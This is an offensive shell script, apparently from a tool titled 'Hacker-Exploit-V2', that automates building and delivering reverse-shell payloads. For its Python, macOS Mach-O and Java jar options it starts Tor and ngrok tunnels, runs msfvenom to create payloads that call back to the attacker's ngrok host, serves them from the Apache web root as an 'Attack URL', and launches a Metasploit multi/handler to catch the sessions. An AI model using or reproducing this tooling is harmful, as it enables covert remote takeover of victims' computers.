LPARTH=`pwd`

function delay()
{
    sleep 0.80;
}

#
# Description : print out executing progress
# 
CURRENT_PROGRESS=0
function progress()
{
    PARAM_PROGRESS=$1;
    PARAM_PHASE=$2;

    if [ $CURRENT_PROGRESS -le 0 -a $PARAM_PROGRESS -ge 0 ]  ; then echo -ne "[..........................] (0%)  $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 5 -a $PARAM_PROGRESS -ge 5 ]  ; then echo -ne "[#.........................] (5%)  $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 10 -a $PARAM_PROGRESS -ge 10 ]; then echo -ne "[##........................] (10%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 15 -a $PARAM_PROGRESS -ge 15 ]; then echo -ne "[###.......................] (15%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 20 -a $PARAM_PROGRESS -ge 20 ]; then echo -ne "[####......................] (20%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 25 -a $PARAM_PROGRESS -ge 25 ]; then echo -ne "[#####.....................] (25%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 30 -a $PARAM_PROGRESS -ge 30 ]; then echo -ne "[######....................] (30%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 35 -a $PARAM_PROGRESS -ge 35 ]; then echo -ne "[#######...................] (35%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 40 -a $PARAM_PROGRESS -ge 40 ]; then echo -ne "[########..................] (40%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 45 -a $PARAM_PROGRESS -ge 45 ]; then echo -ne "[#########.................] (45%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 50 -a $PARAM_PROGRESS -ge 50 ]; then echo -ne "[##########................] (50%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 55 -a $PARAM_PROGRESS -ge 55 ]; then echo -ne "[###########...............] (55%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 60 -a $PARAM_PROGRESS -ge 60 ]; then echo -ne "[############..............] (60%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 65 -a $PARAM_PROGRESS -ge 65 ]; then echo -ne "[#############.............] (65%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 70 -a $PARAM_PROGRESS -ge 70 ]; then echo -ne "[###############...........] (70%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 75 -a $PARAM_PROGRESS -ge 75 ]; then echo -ne "[#################.........] (75%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 80 -a $PARAM_PROGRESS -ge 80 ]; then echo -ne "[####################......] (80%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 85 -a $PARAM_PROGRESS -ge 85 ]; then echo -ne "[#######################...] (85%) $PARAM_PHASE \r"  ; delay; fi;
    if [ $CURRENT_PROGRESS -le 90 -a $PARAM_PROGRESS -ge 90 ]; then echo -ne "[##########################] (100%) $PARAM_PHASE \r" ; delay; fi;
    if [ $CURRENT_PROGRESS -le 100 -a $PARAM_PROGRESS -ge 100 ];then echo -ne 'Done!                                            \n' ; delay; fi;

    CURRENT_PROGRESS=$PARAM_PROGRESS;

}



clear 
RED=$'\e[1;31m'
GREEN=$'\e[1;32m'
YELLOW=$'\e[1;33m'
BLUE=$'\e[1;34m'
RESTORE=$'\e[0m'
	echo "${GREEN} WELCOME TO The ${RESTORE}"
	echo "${RESTORE}"
	echo "${YELLOW}"

echo "                                                                                                          "     
echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
echo "                                                                                                          "
egrep -i ver toolinfo;
echo "${RESTORE}"
echo "${RED}=============================================================================================================="
echo "${RESTORE}"
echo "[${GREEN}MAC/LINUX${RESTORE}]Select your Attack System "



select planet in "Python-shell" "Payload-Macho" "Payload-JAVA-jar" "back" 

do


#==========1=================1====================1========================1========================1====================1=========================1=============


if [ "$planet" == Python-shell ]

then
 
			clear
	

			
			echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${YELLOW}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"
			
			


echo "${RESTORE}"
echo "${YELLOW}=============================================================================================================="
echo "${RESTORE}"

	service tor start
		sleep 4.3;
		echo "${GREEN}[*] ${YELLOW}NGROK Por-Forwarding starting ....${RESTORE}"
		xterm -hold -T "Hacker-Exploit-V2" -e "proxychains $LPARTH/ngrok tcp 8080" &
		sleep 4.3;
		echo "${RESTORE}"

		echo "EXAMPLE :  tcp://${GREEN}0.tcp.ngrok.io${RESTORE}:${YELLOW}18326 ${RESTORE}-> localhost:8080  "
		echo "EXAMPLE : ( ${GREEN}Green${RESTORE} color URL is your tcp lhost and ${YELLOW}Yellow${RESTORE} color is your current LPORT ) "
		echo "${RESTORE}"
echo ""
		echo " please input your current NGROK url "
		read -p ' HE :~' IP

		echo " please input your NGROK Port number "
		read -p ' HE :~ ' PORT


		echo " please input your choice App name"
		read -p ' HE :~ ' APPNAME 
echo " "
	xterm -hold -T "Hacker-Exploit-V2 > PAYLOAD SHEAR WITH NGROK URL " -e "$LPARTH/ngrok http -region eu 80" &
	sleep 2.55;
	echo "[*] EXAMPLE :  http://${GREEN}3X4mpu13.ngrok.io${RESTORE}:${YELLOW}-> http://localhost:8080  ${RESTORE} "
	echo "[*] EXAMPLE : ( ${GREEN}Green${RESTORE} color URL is your HTTP Connection and ${YELLOW}Yellow${RESTORE} color is your Local Connection ) "
echo " "
	echo " please input your || [ exampul:${GREEN}Green${RESTORE} ] NGROK HTTP URL "
	read -p ' HE :~ ' NGHTTPWH

echo ""
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>START<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo ""
	

			echo "The task is in progress, please wait a few minute"

			#Do some tasks
			progress 12 Initialize

			    echo "${YELLOW}[*] Remove Case Output system. ${GREEN}DONE"



			rm -rf $LPARTH/WH-output
	
			progress 10 "Processing..."

			mkdir $LPARTH/WH-output


			echo "${YELLOW}[*] Create Output system > complete ${GREEN}DONE"



			progress 20 "Processing..."

			#main-action ==================================================01===run

		
			sudo msfvenom -p cmd/unix/reverse_python Lhost=$IP Lport=$PORT -f raw -o $LPARTH/WH-output/$APPNAME.py
			#main-action ==================================================01===done
			echo "${YELLOW}[*] Create Payload > complete. ${GREEN}DONE"
			
			progress 50 "Processing..."
			cp $LPARTH/WH-output/$APPNAME.py /var/www/html/$APPNAME.py
			


			#OUTPUT 

			echo "${YELLOW}[*] Remove Msfconsole case ${BLUE}RC file > Complete . ${GREEN}DONE "
			rm -rf $LPARTH/temp
			sleep 0.90;

			progress 75 "Processing..."

			sudo service apache2 start

			mkdir $LPARTH/temp

			progress 85 "Processing..."

			touch $LPARTH/temp/$APPNAME.rc 
			echo "${YELLOW}[*] Create Msfconsole  ${BLUE}RC file > Complete . ${GREEN}DONE "
			sleep 0.90;
			progress 90 "Processing..."
			#exquate ip & port & handeler & payload 

			echo " use multi/handler" >> $LPARTH/temp/$APPNAME.rc 
			echo " set PAYLOAD cmd/unix/reverse_python " >> $LPARTH/temp/$APPNAME.rc
			echo " set LHOST localhost " >> $LPARTH/temp/$APPNAME.rc
			echo " set LPORT 8080 " >> $LPARTH/temp/$APPNAME.rc
 			echo " exploit -j -z " >> $LPARTH/temp/$APPNAME.rc
			echo "${YELLOW}[*] Input data for Msfconsole in ${BLUE}RC file > Complete . ${GREEN}DONE "
			sleep 0.90;
			
			progress 100 "Processing... done"
			echo

			sleep 4.1;

			clear

			echo "${YELLOW}"
			echo " WELCOME TO The "
				
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${RESTORE}"
			echo "${YELLOW}=============================================================================================================="
			echo "${RESTORE}"
			echo "your LHOST or local ip was set ${GREEN}'$IP' "
			echo "${RESTORE}"
			echo "your LPORT or local port was set ${GREEN}'$PORT' "
			echo "${RESTORE}"
			echo "your output app name was set ${GREEN}'$APPNAME' "
			echo "${RESTORE}"
			echo "your Attack URL ${GREEN}'http://$NGHTTPWH/$APPNAME.py' "
			echo "${RESTORE}"
			echo " opening msfconsole  "
			echo "${YELLOW}=============================================================================================================="
			echo "${RESTORE}"
			

			sudo msfconsole -r $LPARTH/temp/$APPNAME.rc


			clear
			bash $LPARTH/actions/ng-mac.sh













		#OPTIONS =====2============2=====================2===================2=================2============2==========





















elif [ "$planet" == Payload-Macho ]
then
    
 
			clear
	

			
			echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${YELLOW}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"
			
			

		

echo "${YELLOW}=============================================================================================================="
echo "${RESTORE}"

#data input
	service tor start
		sleep 4.3;
		echo "${GREEN}[*] ${YELLOW}NGROK Por-Forwarding starting ....${RESTORE}"
		xterm -hold -T "Hacker-Exploit-V2" -e "proxychains $LPARTH/ngrok tcp 8080" &
		sleep 4.3;
		echo "${RESTORE}"

		echo "EXAMPLE :  tcp://${GREEN}0.tcp.ngrok.io${RESTORE}:${YELLOW}18326 ${RESTORE}-> localhost:8080  "
		echo "EXAMPLE : ( ${GREEN}Green${RESTORE} color URL is your tcp lhost and ${YELLOW}Yellow${RESTORE} color is your current LPORT ) "
		echo "${RESTORE}"
echo ""
		echo " please input your current NGROK url "
		read -p ' HE :~' IP

		echo " please input your NGROK Port number "
		read -p ' HE :~ ' PORT


		echo " please input your choice App name"
		read -p ' HE :~ ' APPNAME 
echo " "
	xterm -hold -T "Hacker-Exploit-V2 > PAYLOAD SHEAR WITH NGROK URL " -e "$LPARTH/ngrok http -region eu 80" &
	sleep 2.55;
	echo "[*] EXAMPLE :  http://${GREEN}3X4mpu13.ngrok.io${RESTORE}:${YELLOW}-> http://localhost:8080  ${RESTORE} "
	echo "[*] EXAMPLE : ( ${GREEN}Green${RESTORE} color URL is your HTTP Connection and ${YELLOW}Yellow${RESTORE} color is your Local Connection ) "
echo " "
	echo " please input your || [ exampul:${GREEN}Green${RESTORE} ] NGROK HTTP URL "
	read -p ' HE :~ ' NGHTTPWH
echo ""
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>START<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo ""
	
			echo "The task is in progress, please wait a few minute"

			#Do some tasks
			progress 12 Initialize

			    echo "${YELLOW}[*] Remove Case Output system. ${GREEN}DONE"



			rm -rf $LPARTH/WH-output
	
			progress 10 "Processing..."

			mkdir $LPARTH/WH-output


			echo "${YELLOW}[*] Create Output system > complete ${GREEN}DONE"



			progress 20 "Processing..."

			#main-action ==================================================01===run

		
			sudo msfvenom -p osx/x86/shell_reverse_tcp lhost=$IP lport=$PORT -f macho -o $LPARTH/WH-output/$APPNAME.macho
			#main-action ==================================================01===done
			echo "${YELLOW}[*] Create Payload > complete. ${GREEN}DONE"
			
			progress 50 "Processing..."
			cp $LPARTH/WH-output/$APPNAME.macho /var/www/html/$APPNAME.macho
			


			#OUTPUT 

			echo "${YELLOW}[*] Remove Msfconsole case ${BLUE}RC file > Complete . ${GREEN}DONE "
			rm -rf $LPARTH/temp
			sleep 0.90;

			progress 75 "Processing..."

			
			sudo service apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Start apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
			mkdir $LPARTH/temp

			progress 85 "Processing..."

			touch $LPARTH/temp/$APPNAME.rc 
			echo "${YELLOW}[*] Create Msfconsole  ${BLUE}RC file > Complete . ${GREEN}DONE "
			sleep 0.90;
			progress 90 "Processing..."
			#exquate ip & port & handeler & payload 

			echo " use multi/handler" >> $LPARTH/temp/$APPNAME.rc 
			echo " set PAYLOAD osx/x86/shell_reverse_tcp " >> $LPARTH/temp/$APPNAME.rc
			echo " set LHOST 127.0.0.1 " >> $LPARTH/temp/$APPNAME.rc
			echo " set LPORT 8080 " >> $LPARTH/temp/$APPNAME.rc
			echo " exploit -j -z " >> $LPARTH/temp/$APPNAME.rc

			echo "${YELLOW}[*] Input data for Msfconsole in ${BLUE}RC file > Complete . ${GREEN}DONE "
			sleep 0.90;
			
			progress 100 "Processing... done"
			echo

			sleep 4.1;

			clear

			echo "${YELLOW}"
			echo " WELCOME TO The "
				
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${RESTORE}"
			echo "${YELLOW}=============================================================================================================="
			echo "${RESTORE}"
			echo "your LHOST or local ip was set ${GREEN}'$IP' "
			echo "${RESTORE}"
			echo "your LPORT or local port was set ${GREEN}'$PORT' "
			echo "${RESTORE}"
			echo "your output app name was set ${GREEN}'$APPNAME' "
			echo "${RESTORE}"
			echo "your Attack URL ${GREEN}'http://$NGHTTPWH/$APPNAME.macho' "
			echo "${RESTORE}"
			echo " opening msfconsole  "
			echo "${YELLOW}=============================================================================================================="
			echo "${RESTORE}"
			

			sudo msfconsole -r $LPARTH/temp/$APPNAME.rc


			clear
			bash $LPARTH/actions/ng-mac.sh
			#========================3==================3================S===============3===================3==================#


elif [ "$planet" == Payload-JAVA-jar ]
then


    
 



 
			clear
	

			
			echo "${GREEN}"

			echo " WELCOME TO The "
			echo "${YELLOW}"	
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${YELLOW}"
			
			
			





echo "${YELLOW}=============================================================================================================="
echo "${RESTORE}"

#data input
	service tor start
		sleep 4.3;
		echo "${GREEN}[*] ${YELLOW}NGROK Por-Forwarding starting ....${RESTORE}"
		xterm -hold -T "Hacker-Exploit-V2" -e "proxychains $LPARTH/ngrok tcp 8080" &
		sleep 4.3;
		echo "${RESTORE}"

		echo "EXAMPLE :  tcp://${GREEN}0.tcp.ngrok.io${RESTORE}:${YELLOW}18326 ${RESTORE}-> localhost:8080  "
		echo "EXAMPLE : ( ${GREEN}Green${RESTORE} color URL is your tcp lhost and ${YELLOW}Yellow${RESTORE} color is your current LPORT ) "
		echo "${RESTORE}"
echo ""
		echo " please input your current NGROK url "
		read -p ' HE :~' IP

		echo " please input your NGROK Port number "
		read -p ' HE :~ ' PORT


		echo " please input your choice App name"
		read -p ' HE :~ ' APPNAME 

echo " "
	xterm -hold -T "Hacker-Exploit-V2 > PAYLOAD SHEAR WITH NGROK URL " -e "$LPARTH/ngrok http -region eu 80" &
	sleep 2.55;
	echo "[*] EXAMPLE :  http://${GREEN}3X4mpu13.ngrok.io${RESTORE}:${YELLOW}-> http://localhost:8080  ${RESTORE} "
	echo "[*] EXAMPLE : ( ${GREEN}Green${RESTORE} color URL is your HTTP Connection and ${YELLOW}Yellow${RESTORE} color is your Local Connection ) "
 echo " "
	echo " please input your || [ exampul:${GREEN}Green${RESTORE} ] NGROK HTTP URL "
	read -p ' HE :~ ' NGHTTPWH
echo ""
echo ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>START<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
echo ""
	
			echo "The task is in progress, please wait a few minute"

			#Do some tasks
			progress 12 Initialize

			    echo "${YELLOW}[*] Remove Case Output system. ${GREEN}DONE"



			rm -rf $LPARTH/WH-output
	
			progress 10 "Processing..."

			mkdir $LPARTH/WH-output


			echo "${YELLOW}[*] Create Output system > complete ${GREEN}DONE"



			progress 20 "Processing..."

			#main-action ==================================================01===run

		
			sudo msfvenom -p java/meterpreter/reverse_tcp lhost=$IP lport=$PORT -f jar -o $LPARTH/WH-output/$APPNAME.jar

			#main-action ==================================================01===done
			echo "${YELLOW}[*] Create Payload > complete. ${GREEN}DONE"
			
			progress 50 "Processing..."
			cp $LPARTH/WH-output/$APPNAME.jar /var/www/html/$APPNAME.jar
			


			#OUTPUT 

			echo "${YELLOW}[*] Remove Msfconsole case ${BLUE}RC file > Complete . ${GREEN}DONE "
			rm -rf $LPARTH/temp
			sleep 0.90;

			progress 75 "Processing..."

			
			sudo service apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Start apache2 webserver" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
			mkdir $LPARTH/temp

			progress 85 "Processing..."

			touch $LPARTH/temp/$APPNAME.rc 
			echo "${YELLOW}[*] Create Msfconsole  ${BLUE}RC file > Complete . ${GREEN}DONE "
			sleep 0.90;
			progress 90 "Processing..."
			#exquate ip & port & handeler & payload 

			echo " use multi/handler" >> $LPARTH/temp/$APPNAME.rc 
			echo " set PAYLOAD java/meterpreter/reverse_tcp " >> $LPARTH/temp/$APPNAME.rc
			echo " set LHOST localhost " >> $LPARTH/temp/$APPNAME.rc
			echo " set LPORT 8080 " >> $LPARTH/temp/$APPNAME.rc
			echo " exploit -j -z " >> $LPARTH/temp/$APPNAME.rc

			echo "${YELLOW}[*] Input data for Msfconsole in ${BLUE}RC file > Complete . ${GREEN}DONE "
			sleep 0.90;
			
			progress 100 "Processing... done"
			echo

			sleep 4.1;

			clear

			echo "${YELLOW}"
			echo " WELCOME TO The "
				
			echo "                                                                                                          "     
			echo " ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗"
			echo " ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝"
			echo " ███████║███████║██║     █████╔╝ █████╗  ██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   "
			echo " ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   "
			echo " ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   "
			echo " ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
			echo "                                                                                                          "
			egrep -i ver toolinfo;

			echo "${RESTORE}"
			echo "${YELLOW}=============================================================================================================="
			echo "${RESTORE}"
			echo "your LHOST or local ip was set ${GREEN}'$IP' "
			echo "${RESTORE}"
			echo "your LPORT or local port was set ${GREEN}'$PORT' "
			echo "${RESTORE}"
			echo "your output app name was set ${GREEN}'$APPNAME' "
			echo "${RESTORE}"
			echo "your Attack URL ${GREEN}'http://$NGHTTPWH/$APPNAME.jar' "
			echo "${RESTORE}"
			echo " opening msfconsole  "
			echo "${YELLOW}=============================================================================================================="
			echo "${RESTORE}"
			

			sudo msfconsole -r $LPARTH/temp/$APPNAME.rc


			clear
			bash $LPARTH/actions/ng-mac.sh


















elif [ "$planet" == back ]
then
   bash $LPARTH/advance-action-HE2.sh




fi
done
